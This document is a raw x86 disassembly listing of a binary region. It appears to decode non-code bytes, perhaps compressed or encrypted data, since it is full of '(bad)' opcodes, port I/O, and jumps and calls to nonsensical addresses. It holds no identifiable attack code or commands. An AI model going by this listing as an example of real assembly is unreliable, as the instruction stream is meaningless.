  41ed5b:	or     eax,0x7dee54e7
  41ed60:	push   ecx
  41ed61:	pop    edx
  41ed62:	adc    BYTE PTR [ebx+0x66a2ada3],ch
  41ed68:	aas    
  41ed69:	push   ds
  41ed6a:	adc    ch,BYTE PTR [ebx]
  41ed6c:	jl     0x41edbb
  41ed6e:	shl    edx,0x6a
  41ed71:	call   0xeb288242
  41ed76:	and    al,0x4c
  41ed78:	(bad)  
  41ed79:	jecxz  0x41edcb
  41ed7b:	inc    esi
  41ed7c:	les    esp,FWORD PTR ds:0x48af4df4
  41ed82:	xor    ch,dh
  41ed84:	retf   
  41ed85:	je     0x41edee
  41ed87:	(bad)  
  41ed88:	loopne 0x41ed4b
  41ed8a:	pop    esp
  41ed8b:	adc    BYTE PTR [esi],bl
  41ed8d:	daa    
  41ed8e:	pop    ecx
  41ed8f:	sub    bl,BYTE PTR [ecx+0x71]
  41ed92:	imul   ebx,DWORD PTR [ecx-0x18cf8aa7],0xffffff83
  41ed99:	leave  
  41ed9a:	inc    ebx
  41ed9b:	xor    esp,DWORD PTR [eax-0x23729d06]
  41eda1:	push   ecx
  41eda2:	std    
  41eda3:	push   ss
  41eda4:	xchg   esp,eax
  41eda5:	les    edi,FWORD PTR [ecx+0x6eedfda8]
  41edab:	xchg   esp,eax
  41edac:	mov    edi,0x7c9a6d80
  41edb1:	and    al,0xc5
  41edb3:	(bad)  
  41edb4:	pop    esp
	...
  41ee15:	add    BYTE PTR ds:0x7b197956,al
  41ee1b:	aas    
  41ee1c:	gs pop esi
  41ee1e:	mov    ds:0xe675b0a2,al
  41ee23:	add    dl,ch
  41ee25:	and    al,0x20
  41ee27:	inc    edi
  41ee28:	add    DWORD PTR [eax],eax
  41ee2a:	pop    es
  41ee2b:	add    DWORD PTR [eax],eax
  41ee2d:	add    BYTE PTR [esi-0x5f],ch
  41ee30:	inc    edi
  41ee31:	js     0x41edb8
  41ee33:	mov    bl,0xa7
  41ee35:	pop    esi
  41ee36:	das    
  41ee37:	sub    ecx,DWORD PTR es:[eax+0x21]
  41ee3b:	push   cs
  41ee3c:	adc    BYTE PTR [ebp-0x7d8d6e03],dh
  41ee42:	mov    ebp,0x71565664
  41ee47:	adc    al,0xe4
  41ee49:	or     eax,0x1d1fd6f4
  41ee4e:	and    al,0xfb
  41ee50:	es mov ebx,0xaa025e3e
  41ee56:	push   ss
  41ee57:	lahf   
  41ee58:	push   es
  41ee59:	das    
  41ee5a:	(bad)  
  41ee5b:	retf   0x4010
  41ee5e:	xor    eax,0x1ec4e7ea
  41ee63:	push   0x13
  41ee65:	pop    edi
  41ee66:	sbb    al,0xf
  41ee68:	sub    BYTE PTR [ebx+0x50],0xe0
  41ee6c:	adc    DWORD PTR [eax+0xf],edx
  41ee6f:	std    
  41ee70:	mov    dl,BYTE PTR [edi+0xd5a14ca]
  41ee76:	mov    cl,BYTE PTR [edx-0x1e8bf8fe]
  41ee7c:	lea    ebx,[edi-0x691b4986]
  41ee82:	jecxz  0x41ee43
  41ee84:	inc    edx
  41ee85:	fbstp  TBYTE PTR [edx]
  41ee87:	mov    edx,0xfcf77b77
  41ee8c:	daa    
  41ee8d:	arpl   WORD PTR [esi+eax*1+0x6fccc413],dx
  41ee94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee95:	sub    edi,ebx
  41ee97:	pushf  
  41ee98:	xor    esi,esi
  41ee9a:	push   cs
  41ee9b:	xchg   esi,eax
  41ee9c:	and    al,0x2c
  41ee9e:	jg     0x41ee27
  41eea0:	or     bl,dl
  41eea2:	adc    al,0x3
  41eea4:	adc    DWORD PTR [esi+0x2d],edx
  41eea7:	call   0x7971ce10
  41eeac:	enter  0x3d2e,0x21
  41eeb0:	fs inc ebp
  41eeb2:	mov    bp,0x5723
  41eeb6:	out    dx,al
  41eeb7:	or     esi,ebp
  41eeb9:	ds jne 0x41ef2d
  41eebc:	sar    DWORD PTR [ebx+0x7a],cl
  41eebf:	mov    esp,0xdfca8723
  41eec4:	rcr    BYTE PTR [ebx],cl
  41eec6:	cdq    
  41eec7:	and    BYTE PTR [eax],bl
  41eec9:	ret    
  41eeca:	lea    esi,[esi+0x10]
  41eecd:	je     0x41ee5e
  41eecf:	and    dh,dh
  41eed1:	mov    dh,0x6e
  41eed3:	fucomi st,st(3)
  41eed5:	fwait
  41eed6:	loope  0x41ef40
  41eed8:	mov    ecx,DWORD PTR [edx+0x29e97027]
  41eede:	push   eax
  41eedf:	add    eax,0xd26c3a30
  41eee4:	fucomp st(7)
  41eee6:	push   ds
  41eee7:	mov    edx,esi
  41eee9:	xchg   esp,eax
  41eeea:	dec    edx
  41eeeb:	push   ebx
  41eeec:	xor    ecx,ebp
  41eeee:	inc    BYTE PTR [eax+0x49d3a8fc]
  41eef4:	mov    ebx,0x15ae3b0b
  41eef9:	outs   dx,DWORD PTR ds:[esi]
  41eefa:	fstp   DWORD PTR [ecx]
  41eefc:	xchg   ebx,eax
  41eefd:	adc    ebx,0xbe621d75
  41ef03:	add    bh,al
  41ef05:	pop    ebp
  41ef06:	adc    BYTE PTR [eax-0x2a],dh
  41ef09:	fs fcmovne st,st(2)
  41ef0c:	jg     0x41ef5a
  41ef0e:	icebp  
  41ef0f:	lahf   
  41ef10:	ficomp WORD PTR [ebx-0x62]
  41ef13:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef14:	mov    esi,0x6c1d8355
  41ef19:	mov    cl,dh
  41ef1b:	(bad)  
  41ef1c:	xchg   edi,eax
  41ef1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef1e:	rol    BYTE PTR [edx],1
  41ef20:	(bad)
  41ef23:	cs int3 
  41ef25:	and    BYTE PTR [ecx-0x78552731],dl
  41ef2b:	mov    eax,0x585ccf8b
  41ef30:	adc    eax,0x3e98e6f7
	...
  41ef95:	add    BYTE PTR [ecx-0xda40a3],bh
  41ef9b:	out    0xbb,eax
  41ef9d:	fnstsw WORD PTR [eax+0x4efceb38]
  41efa3:	and    BYTE PTR [esi+0x69],ch
  41efa6:	daa    
  41efa7:	dec    eax
  41efa8:	add    DWORD PTR [eax],eax
  41efaa:	pop    es
  41efab:	add    DWORD PTR [eax],eax
  41efad:	add    BYTE PTR [ebx+0x5a],bh
  41efb0:	sar    DWORD PTR [eax+0x59b3ea38],cl
  41efb6:	jmp    0x424fc87a
  41efbb:	aad    0xe2
  41efbd:	lea    eax,[edi+0x491d82c9]
  41efc3:	cmp    eax,0xabd306ae
  41efc8:	cs ss cmp al,0x90
  41efcc:	adc    BYTE PTR [esi],bl
  41efce:	mov    al,0xa8
  41efd0:	shl    ebp,cl
  41efd2:	lods   eax,DWORD PTR ds:[esi]
  41efd3:	iret   
  41efd4:	frstor [edi+ebp*4+0x70aea13a]
  41efdb:	shr    BYTE PTR [eax-0x550e73a5],1
  41efe1:	fwait
  41efe2:	rcr    ch,0x95
  41efe5:	sbb    dh,dh
  41efe7:	or     ch,BYTE PTR [eax]
  41efe9:	call   0x5081:0x69cf0d35
  41eff0:	mov    WORD PTR [esi-0x7],gs
  41eff3:	shl    DWORD PTR [eax-0x46cc10c8],cl
  41eff9:	imul   ebx,DWORD PTR [ebx+0x4a],0x29db1c25
  41f000:	shr    BYTE PTR [edx-0x34],1
  41f003:	and    ch,BYTE PTR [ebx+0x56e1e117]
  41f009:	sti    
  41f00a:	push   ebx
  41f00b:	pusha  
  41f00c:	add    DWORD PTR [ebx],edx
  41f00e:	cwde   
  41f00f:	not    DWORD PTR [esi]
  41f011:	out    dx,al
  41f012:	iret   
  41f013:	imul   ebp,DWORD PTR [eax+0x6],0x1d3e34ec
  41f01a:	bound  edi,QWORD PTR [edx]
  41f01c:	push   esi
  41f01d:	test   DWORD PTR [ecx+eiz*2+0x47],ebp
  41f021:	xlat   BYTE PTR ds:[ebx]
  41f022:	adc    dh,bh
  41f024:	pop    esi
  41f025:	xchg   esp,eax
  41f026:	imul   edx,DWORD PTR [eax-0x75],0xffffff9c
  41f02a:	mov    dl,0xa3
  41f02c:	mov    edx,0x53befb69
  41f031:	xor    esi,DWORD PTR [edx-0x6cf6463d]
  41f037:	cmc    
  41f038:	aad    0x6e
  41f03a:	pop    es
  41f03b:	mov    ah,0x3
  41f03d:	je     0x41f084
  41f03f:	adc    cl,cl
  41f041:	addr16 jo 0x41f095
  41f044:	int    0x64
  41f046:	stc    
  41f047:	xchg   edi,eax
  41f048:	sahf   
  41f049:	(bad)  
  41f04b:	xchg   ebp,eax
  41f04c:	mov    esp,0xc4ca277c
  41f051:	add    DWORD PTR [esi+edi*1+0x2c9ea646],0xffffffc8
  41f059:	leave  
  41f05a:	xchg   ecx,eax
  41f05b:	aam    0xe2
  41f05d:	or     eax,0xd126fd32
  41f062:	sub    ecx,ebx
  41f064:	(bad)  
  41f065:	imul   eax,DWORD PTR [eax+0x22],0xffffffff
  41f069:	push   ebx
  41f06a:	mov    ebx,0x7098e027
  41f06f:	leave  
  41f070:	imul   ebx
  41f072:	lea    ebx,[edi]
  41f074:	inc    ebp
  41f075:	add    eax,0xe980186d
  41f07a:	inc    edx
  41f07b:	stos   BYTE PTR es:[edi],al
  41f07c:	stc    
  41f07d:	pop    esi
  41f07e:	add    eax,0xcfd4e8ce
  41f083:	inc    esi
  41f084:	shl    DWORD PTR [edx+0x11],cl
  41f087:	xor    DWORD PTR cs:[edi],0x7e
  41f08b:	enter  0x1093,0xc5
  41f08f:	mov    fs,WORD PTR [edi]
  41f091:	shl    BYTE PTR [edi+0x9],1
  41f094:	jmp    0xf25f99ef
  41f099:	div    DWORD PTR [ebx]
  41f09b:	inc    edx
  41f09c:	xchg   edx,eax
  41f09d:	pop    ebx
  41f09e:	and    eax,0x61ea7716
  41f0a3:	leave  
  41f0a4:	sbb    al,0xf4
  41f0a6:	pop    esp
  41f0a7:	inc    edi
  41f0a8:	mov    esp,0x646eadb8
  41f0ad:	sub    dl,BYTE PTR [edi]
  41f0af:	call   0xcc:0xc33748c9
	...
  41f116:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f11b:	mov    ebx,0x6df0ffdf
  41f120:	sub    dh,BYTE PTR [ecx-0x2a79c758]
  41f126:	cs dec ecx
  41f128:	add    DWORD PTR [eax],eax
  41f12a:	pop    es
  41f12b:	add    DWORD PTR [eax],eax
  41f12d:	add    BYTE PTR [ebx+ebx*8+0x10],dl
  41f131:	sub    bl,bh
  41f133:	(bad)  
  41f134:	xchg   ebx,eax
  41f135:	or     ah,BYTE PTR [eax+0x50]
  41f138:	dec    esp
  41f139:	gs stos BYTE PTR es:[edi],al
  41f13b:	call   0x6f3d1ef5
  41f140:	pop    eax
  41f141:	sub    eax,0x4179aaa
  41f146:	inc    edx
  41f147:	cmp    BYTE PTR [ebx],bh
  41f149:	pop    ss
  41f14a:	sbb    DWORD PTR [ecx-0x573d7557],esi
  41f150:	ins    BYTE PTR es:[edi],dx
  41f151:	sub    esi,DWORD PTR [esi]
  41f153:	or     al,0x6c
  41f155:	lods   eax,DWORD PTR ds:[esi]
  41f156:	mov    bl,0x9f
  41f158:	cmp    DWORD PTR [ebx],eax
  41f15a:	out    0xdd,al
  41f15c:	or     DWORD PTR [ebp-0x6253fe51],0xffffffd6
  41f163:	jg     0x41f17f
  41f165:	loop   0x41f17b
  41f167:	sub    al,0xa6
  41f169:	and    ch,ch
  41f16b:	push   es
  41f16c:	xchg   esp,eax
  41f16d:	fld    DWORD PTR [ecx+0x35]
  41f170:	leave  
  41f171:	push   edi
  41f172:	shl    BYTE PTR [eax-0x7],1
  41f175:	fcomp  QWORD PTR [ecx]
  41f177:	xchg   edi,eax
  41f178:	jno    0x41f193
  41f17a:	into   
  41f17b:	in     al,0x4c
  41f17d:	fcom   DWORD PTR [ecx-0x56d097ec]
  41f183:	loope  0x41f1e7
  41f185:	jl     0x41f1c4
  41f187:	sub    BYTE PTR [edx-0x73a7acae],0x77
  41f18e:	lahf   
  41f18f:	in     al,0x92
  41f191:	cmc    
  41f192:	and    ebp,esi
  41f194:	xlat   BYTE PTR ds:[ebx]
  41f195:	xchg   ebp,eax
  41f196:	ret    
  41f197:	xor    eax,0x8f2fb7bf
  41f19c:	fldenv [ecx+0x4e14f625]
  41f1a2:	sub    al,0x61
  41f1a4:	inc    edi
  41f1a5:	jp     0x41f193
  41f1a7:	fsubr  DWORD PTR [ebx-0x7f]
  41f1aa:	or     eax,0x12a34bec
  41f1af:	add    al,0xb3
  41f1b1:	sub    ah,dh
  41f1b3:	jl     0x41f1f7
  41f1b5:	loopne 0x41f177
  41f1b7:	jle    0x41f17b
  41f1b9:	dec    edi
  41f1ba:	es addr16 and al,0x91
  41f1be:	inc    esp
  41f1bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1c0:	test   ecx,eax
  41f1c2:	repz lock retfw 
  41f1c6:	cld    
  41f1c7:	or     dh,BYTE PTR [esi]
  41f1c9:	jge    0x41f1cd
  41f1cb:	xchg   BYTE PTR [edi+0x2c],dh
  41f1ce:	push   cs
  41f1cf:	jae    0x41f180
  41f1d1:	out    dx,al
  41f1d2:	popw   ds
  41f1d4:	pop    eax
  41f1d5:	cmp    edx,DWORD PTR [eax+0x1e15037]
  41f1db:	or     al,0xfb
  41f1dd:	and    dl,BYTE PTR [edx-0x47]
  41f1e0:	and    eax,0x5ed7452a
  41f1e5:	ror    BYTE PTR ds:0x509b4e90,cl
  41f1eb:	fcomp  DWORD PTR [edi+eax*1+0x54]
  41f1ef:	or     DWORD PTR [edx+eax*4],esp
  41f1f2:	inc    edx
  41f1f3:	fwait
  41f1f4:	pushf  
  41f1f5:	dec    ebp
  41f1f6:	adc    dl,BYTE PTR [edi]
  41f1f8:	jbe    0x41f1db
  41f1fa:	call   0x69df0507
  41f1ff:	jp     0x41f1f9
  41f201:	fdivrp st(6),st
  41f203:	cmp    BYTE PTR [ecx+edx*1-0x12],0x2d
  41f208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f209:	loopne 0x41f27a
  41f20b:	push   esi
  41f20c:	push   ebp
  41f20d:	(bad)  
  41f20e:	daa    
  41f20f:	mov    cl,0xc1
  41f211:	jl     0x41f23a
  41f213:	iret   
  41f214:	xlat   BYTE PTR ds:[ebx]
  41f215:	out    dx,eax
  41f216:	fistp  WORD PTR cs:[edx]
  41f219:	mov    bh,ch
  41f21b:	aas    
  41f21c:	xchg   DWORD PTR [eax+ecx*8+0x3784442a],eax
  41f223:	das    
  41f224:	dec    ebx
  41f225:	inc    edi
  41f226:	pusha  
  41f227:	(bad)  
  41f228:	sbb    BYTE PTR [edx-0x448948e1],bl
  41f22e:	and    bh,dl
  41f230:	mov    ds:0xebcf2cd6,al
	...
  41f295:	add    BYTE PTR [ecx+0x1b],dl
  41f298:	jmp    DWORD PTR [esi-0x1]
  41f29b:	out    0xd9,al
  41f29d:	aas    
  41f29e:	push   eax
  41f29f:	xor    DWORD PTR [edi-0x14],ebx
  41f2a2:	cmp    ebp,DWORD PTR [edx+0x4a35a590]
  41f2a8:	add    DWORD PTR [eax],eax
  41f2aa:	pop    es
  41f2ab:	add    DWORD PTR [eax],eax
  41f2ad:	add    BYTE PTR [edi-0x27f90c65],ch
  41f2b3:	mov    bl,ah
  41f2b5:	pop    ecx
  41f2b6:	mov    al,0x61
  41f2b8:	or     bh,BYTE PTR [eax-0x69]
  41f2bb:	mov    ebx,0x6ecb063b
  41f2c0:	int    0x7
  41f2c2:	mov    al,ds:0x33144e91
  41f2c7:	push   0x6b
  41f2c9:	pushw  ss
  41f2cb:	std    
  41f2cc:	pop    ecx
  41f2cd:	mov    edx,0x242d7107
  41f2d2:	mov    bl,0x64
  41f2d4:	out    0x94,al
  41f2d6:	add    al,0xe8
  41f2d8:	lods   eax,DWORD PTR ds:[esi]
  41f2d9:	mov    DWORD PTR [eax-0x60],edi
  41f2dc:	imul   BYTE PTR [ecx+ebx*4]
  41f2df:	mov    dh,0xcd
  41f2e1:	xor    esi,DWORD PTR [edi+0x30]
  41f2e4:	add    eax,DWORD PTR [ebp+0x40f1d0fc]
  41f2ea:	xchg   edi,edx
  41f2ec:	repz cs cwde 
  41f2ef:	jmp    0x41f297
  41f2f1:	xor    eax,0x8dc9f8f0
  41f2f6:	mov    ds:0x193d5eae,eax
  41f2fb:	sub    BYTE PTR [ebx+edx*1-0x64],0x92
  41f300:	mov    esp,0xd64c0475
  41f305:	jmp    0x41f29f
  41f307:	pusha  
  41f308:	test   al,0x13
  41f30a:	test   al,0x5a
  41f30c:	fdivrp st(4),st
  41f30e:	sar    ch,1
  41f310:	jge    0x41f34f
  41f312:	sbb    BYTE PTR [esi+0x78],0x6f
  41f316:	pop    esp
  41f317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f318:	dec    ebx
  41f319:	es or  eax,0xe77c2325
  41f31f:	sub    bh,BYTE PTR [ebx+edx*1]
  41f322:	dec    edx
  41f323:	sbb    edx,DWORD PTR [ecx]
  41f325:	outs   dx,BYTE PTR ds:[esi]
  41f326:	rol    DWORD PTR [eax],1
  41f328:	retf   
  41f329:	ret    
  41f32a:	test   DWORD PTR [edx-0x24],0x6827d1d4
  41f331:	xchg   ebx,eax
  41f332:	out    dx,eax
  41f333:	cli    
  41f334:	xchg   ecx,eax
  41f335:	jb     0x41f366
  41f337:	pop    esi
  41f338:	dec    ebx
  41f339:	ss stc 
  41f33b:	into   
  41f33c:	pop    eax
  41f33d:	sbb    BYTE PTR [ebx-0x3],al
  41f340:	or     BYTE PTR [eax+0x5d],ch
  41f343:	lods   al,BYTE PTR ds:[esi]
  41f344:	push   ebx
  41f345:	sub    BYTE PTR [ebx-0x2],dl
  41f348:	test   BYTE PTR [ebx-0x6b6bcd4e],bh
  41f34e:	dec    eax
  41f34f:	ins    BYTE PTR es:[edi],dx
  41f350:	sbb    eax,0x2cdaa881
  41f355:	xlat   BYTE PTR ds:[ebx]
  41f356:	and    edx,DWORD PTR [esi]
  41f358:	mov    al,ds:0x7cc023ea
  41f35d:	lock sti 
  41f35f:	sbb    BYTE PTR [edi+0x0],dl
  41f362:	outs   dx,BYTE PTR ds:[esi]
  41f363:	lahf   
  41f364:	sbb    dh,BYTE PTR [ebp-0x8ce89aa]
  41f36a:	or     DWORD PTR [ecx-0x1f],esi
  41f36d:	aam    0x63
  41f36f:	jne    0x41f39b
  41f371:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f372:	push   edx
  41f373:	xchg   BYTE PTR [esi+0x32],bh
  41f376:	scas   al,BYTE PTR es:[edi]
  41f377:	mov    esp,0x48c6a41b
  41f37c:	lods   al,BYTE PTR ds:[esi]
  41f37d:	sti    
  41f37e:	mov    bl,0x21
  41f380:	icebp  
  41f381:	repz pushf 
  41f383:	mov    dh,0x8e
  41f385:	dec    ecx
  41f386:	jae    0x41f3d8
  41f388:	js     0x41f3cb
  41f38a:	out    dx,al
  41f38b:	aad    0xc5
  41f38d:	inc    ebp
  41f38e:	repnz and BYTE PTR [eax+0x27223d68],bh
  41f395:	jmp    0x41f3e7
  41f397:	(bad)  
  41f398:	out    dx,al
  41f399:	pop    ebx
  41f39a:	cmp    al,BYTE PTR [ebp-0x59]
  41f39d:	fsub   st(5),st
  41f39f:	or     DWORD PTR [eax+0x7cdd45ec],ebp
  41f3a5:	add    bh,al
  41f3a7:	cs pop ss
  41f3a9:	out    dx,eax
  41f3aa:	mov    dh,0x68
  41f3ac:	and    eax,0xc4e32d74
  41f3b1:	push   es
  41f3b2:	mov    esp,0x4c24
	...
  41f413:	add    BYTE PTR [eax],al
  41f415:	add    BYTE PTR [edi+eiz*8],bh
  41f418:	imul   ebp,edi,0xfffffffb
  41f41b:	out    dx,eax
  41f41c:	mov    esp,0xc961c5f7
  41f421:	xchg   edx,eax
  41f422:	inc    ebx
  41f423:	pop    ecx
  41f424:	ja     0x41f405
  41f426:	cmp    al,0x4b
  41f428:	add    DWORD PTR [eax],eax
  41f42a:	pop    es
  41f42b:	add    DWORD PTR [eax],eax
  41f42d:	add    BYTE PTR [esi],dh
  41f42f:	adc    ebx,DWORD PTR [ecx-0x424590e]
  41f435:	cmp    cl,dl
  41f437:	dec    esi
  41f438:	mov    ds:0x55abdd09,al
  41f43d:	push   ecx
  41f43e:	pop    esi
  41f43f:	cmp    ebp,DWORD PTR [ecx+0x795c2e09]
  41f445:	jl     0x41f473
  41f447:	sbb    al,0xd
  41f449:	dec    esi
  41f44a:	stc    
  41f44b:	xchg   esp,eax
  41f44c:	or     al,0x25
  41f44e:	ficomp DWORD PTR [edi]
  41f450:	sub    al,BYTE PTR [eax-0x80]
  41f453:	repz jne 0x41f44d
  41f456:	daa    
  41f457:	cmp    eax,ecx
  41f459:	outs   dx,DWORD PTR ds:[esi]
  41f45a:	adc    BYTE PTR ds:0x4f839268,0xbe
  41f461:	mov    dh,0xd0
  41f463:	xchg   esi,eax
  41f464:	and    eax,0xcbd0a70a
  41f469:	cli    
  41f46a:	loope  0x41f3f1
  41f46c:	add    eax,0x39e3a53b
  41f471:	mov    edi,0x205d10dc
  41f476:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f477:	mov    dh,0x35
  41f479:	std    
  41f47a:	adc    DWORD PTR [edx+0x9],0xb3699cb5
  41f481:	xor    al,0xe5
  41f483:	and    eax,0x534ed75d
  41f488:	xchg   esp,eax
  41f489:	in     al,0xe6
  41f48b:	mov    ebx,0x3d7f8dd3
  41f490:	mov    ecx,0xef1ff8f8
  41f495:	ins    DWORD PTR es:[edi],dx
  41f496:	cs jbe 0x41f43e
  41f499:	push   esi
  41f49a:	cmp    al,0x9a
  41f49c:	jl     0x41f447
  41f49e:	fcmovne st,st(5)
  41f4a0:	cmp    DWORD PTR [ebp-0x4271364d],esi
  41f4a6:	mov    ecx,0xf93e5fb1
  41f4ab:	sbb    bl,BYTE PTR [esi+0x42ae29c7]
  41f4b1:	cmc    
  41f4b2:	fdiv   DWORD PTR [edi-0x4d]
  41f4b5:	cwde   
  41f4b6:	pop    eax
  41f4b7:	or     ecx,edx
  41f4b9:	adc    cl,BYTE PTR [edi-0x60ed8f17]
  41f4bf:	jp     0x41f48c
  41f4c1:	idiv   BYTE PTR fs:[ebx]
  41f4c4:	in     eax,dx
  41f4c5:	and    BYTE PTR [ebx+0x4d452904],dh
  41f4cb:	and    esi,DWORD PTR es:[eax-0x20]
  41f4cf:	dec    eax
  41f4d0:	pop    esi
  41f4d1:	sub    al,0x7c
  41f4d3:	xchg   edi,eax
  41f4d4:	ds loope 0x41f518
  41f4d7:	xor    BYTE PTR [eax],bh
  41f4d9:	imul   ebp,edi,0x2883a2c0
  41f4df:	xor    DWORD PTR [esp+edx*1],esi
  41f4e2:	ja     0x41f466
  41f4e4:	adc    eax,0x863d4946
  41f4e9:	or     eax,0xf92d87d2
  41f4ee:	push   es
  41f4ef:	sar    BYTE PTR [esi+0xa],0x34
  41f4f3:	mov    edi,0xa768fec1
  41f4f8:	js     0x41f4ab
  41f4fa:	pushf  
  41f4fb:	mov    esp,edx
  41f4fd:	mov    ds:0x19f1915b,al
  41f502:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f503:	cmp    DWORD PTR [ecx],ebp
  41f505:	xor    al,0xa8
  41f507:	add    DWORD PTR [edi],esi
  41f509:	add    BYTE PTR [ebx],bh
  41f50b:	bound  ebx,QWORD PTR [ebx-0x4adadb92]
  41f511:	fs push cs
  41f513:	jmp    0xba82ca7d
  41f518:	cmp    DWORD PTR ds:0x9bdec1bd,edx
  41f51e:	xor    BYTE PTR [edx],dh
  41f520:	sar    DWORD PTR [esi],cl
  41f522:	cmp    ah,BYTE PTR [ebx+0x131a7520]
  41f528:	jo     0x41f559
  41f52a:	mov    esi,0xc54f505e
  41f52f:	in     eax,0x86
  41f531:	ret    0xea78
  41f534:	pop    ds
	...
  41f595:	add    BYTE PTR [eax+0x34],bh
  41f598:	add    bh,bl
  41f59a:	dec    esi
  41f59b:	(bad)  
  41f59c:	stc    
  41f59d:	mov    bh,0x14
  41f59f:	pop    ebp
  41f5a0:	sub    cl,ah
  41f5a2:	mov    esp,0x435426f9
  41f5a7:	dec    esp
  41f5a8:	add    DWORD PTR [eax],eax
  41f5aa:	pop    es
  41f5ab:	add    DWORD PTR [eax],eax
  41f5ad:	add    BYTE PTR [esi*2+0x331205b2],dl
  41f5b4:	xor    BYTE PTR [edx+0x20],al
  41f5b7:	and    DWORD PTR [ebx+ebx*8],esp
  41f5ba:	das    
  41f5bb:	mov    DWORD PTR [ebp+0xf],ebx
  41f5be:	or     dl,ch
  41f5c0:	mov    eax,0x5551920e
  41f5c5:	call   0xf267068b
  41f5ca:	pop    ss
  41f5cb:	or     dl,ah
  41f5cd:	rol    ah,cl
  41f5cf:	stc    
  41f5d0:	mov    WORD PTR [eax-0x62a2cd2d],es
  41f5d6:	ds int 0xa1
  41f5d9:	xor    al,BYTE PTR [edi+0x63]
  41f5dc:	mov    ebx,0xdd9b01ff
  41f5e1:	test   al,0x48
  41f5e3:	pop    ebx
  41f5e4:	mov    DWORD PTR [ebp+edx*1+0x971705b],esp
  41f5eb:	out    0x26,eax
  41f5ed:	sbb    eax,DWORD PTR ds:[ecx+0x34b14eb5]
  41f5f4:	ds jmp 0x41f60d
  41f5f7:	or     DWORD PTR ds:0xe6162ef9,0xe0fd7b8
  41f601:	cmp    bh,bh
  41f603:	in     al,0xb9
  41f605:	xlat   BYTE PTR ss:[ebx]
  41f607:	jmp    0x23ee0bd7
  41f60c:	scas   eax,DWORD PTR es:[edi]
  41f60d:	ret    0xddde
  41f610:	push   eax
  41f611:	mov    ebp,DWORD PTR [esi+0x24]
  41f614:	mov    al,ds:0x347aeece
  41f619:	mov    bl,BYTE PTR [edx]
  41f61b:	and    ecx,DWORD PTR [edi]
  41f61d:	call   0x2558:0xe5d46336
  41f624:	mov    ds:0x7c442b7f,eax
  41f629:	dec    ecx
  41f62a:	sbb    bh,0xfd
  41f62d:	out    0x14,al
  41f62f:	sub    edx,DWORD PTR [esi]
  41f631:	fwait
  41f632:	(bad)  
  41f633:	dec    eax
  41f634:	inc    esp
  41f635:	shl    DWORD PTR [ebx],0x5e
  41f638:	xlat   BYTE PTR ds:[ebx]
  41f639:	arpl   WORD PTR [ecx-0x5d5e4c7],sp
  41f63f:	mov    edi,0xd0db8d66
  41f644:	xchg   DWORD PTR [ebx+eiz*1],edi
  41f647:	cmp    dh,BYTE PTR [ecx+ebx*1-0x298084d7]
  41f64e:	sar    dl,1
  41f650:	enter  0x6e66,0x9e
  41f654:	push   0x4fcd204d
  41f659:	push   eax
  41f65a:	and    ecx,eax
  41f65c:	loope  0x41f685
  41f65e:	into   
  41f65f:	mov    ah,0x16
  41f661:	mov    WORD PTR [ecx-0x6b6fceb],es
  41f667:	leave  
  41f668:	jge    0x41f694
  41f66a:	fdivr  QWORD PTR [edi+0x6d]
  41f66d:	pop    esi
  41f66e:	add    ecx,ebp
  41f670:	fcompp 
  41f672:	mov    dl,0xe6
  41f674:	out    dx,eax
  41f675:	xor    DWORD PTR [edx+0x5c9bd373],ebp
  41f67b:	pop    ebx
  41f67c:	xchg   ebx,eax
  41f67d:	pushf  
  41f67e:	pop    es
  41f67f:	cld    
  41f680:	jns    0x41f6ca
  41f682:	jae    0x41f617
  41f684:	loope  0x41f705
  41f686:	xchg   esi,eax
  41f687:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f688:	jge    0x41f628
  41f68a:	scas   eax,DWORD PTR es:[edi]
  41f68b:	xor    eax,0xd4ed3074
  41f690:	xchg   ecx,eax
  41f691:	aam    0x42
  41f693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f694:	dec    edi
  41f695:	fimul  DWORD PTR [esi-0x32]
  41f698:	lar    eax,ax
  41f69b:	cmp    ah,BYTE PTR [esi+0x20]
  41f69e:	pop    ss
  41f69f:	push   edx
  41f6a0:	push   edi
  41f6a2:	imul   edx,DWORD PTR [edx+0x39],0xffffffed
  41f6a6:	test   DWORD PTR [edi+0x4e4a4479],ebx
  41f6ac:	in     eax,dx
  41f6ad:	int3   
  41f6ae:	cmp    eax,0xf6a2cfb2
  41f6b3:	pop    ebx
  41f6b4:	jns    0x41f6b6
	...
  41f716:	xchg   edx,eax
  41f717:	cmp    al,0x23
  41f719:	jle    0x41f6ca
  41f71b:	jg     0x41f6fc
  41f71d:	cld    
  41f71e:	dec    ecx
  41f71f:	loope  0x41f6f2
  41f721:	sbb    DWORD PTR [ebp+0x72],ebx
  41f724:	loope  0x41f6ff
  41f726:	dec    edx
  41f727:	dec    ebp
  41f728:	add    DWORD PTR [eax],eax
  41f72a:	pop    es
  41f72b:	add    DWORD PTR [eax],eax
  41f72d:	add    BYTE PTR [ecx],ch
  41f72f:	push   edi
  41f730:	mov    esp,0x926f08bd
  41f735:	and    edx,esi
  41f737:	mov    edx,0xbbba0711
  41f73c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f73d:	xor    edi,DWORD PTR [ebx]
  41f73f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f740:	ja     0x41f6e5
  41f742:	jge    0x41f7a1
  41f744:	mov    cl,0xbd
  41f746:	stos   DWORD PTR es:[edi],eax
  41f747:	push   ecx
  41f748:	dec    ebp
  41f749:	cmc    
  41f74a:	pop    eax
  41f74b:	xchg   esp,esi
  41f74d:	mov    al,0xb9
  41f74f:	loopne 0x41f6f9
  41f751:	cmp    eax,0x7c867687
  41f756:	popf   
  41f757:	cdq    
  41f758:	jmp    0xdb7291f
  41f75d:	adc    esi,DWORD PTR [ecx+0x6e]
  41f760:	inc    esp
  41f761:	lea    ecx,[eax+0x5d8f1899]
  41f767:	push   es
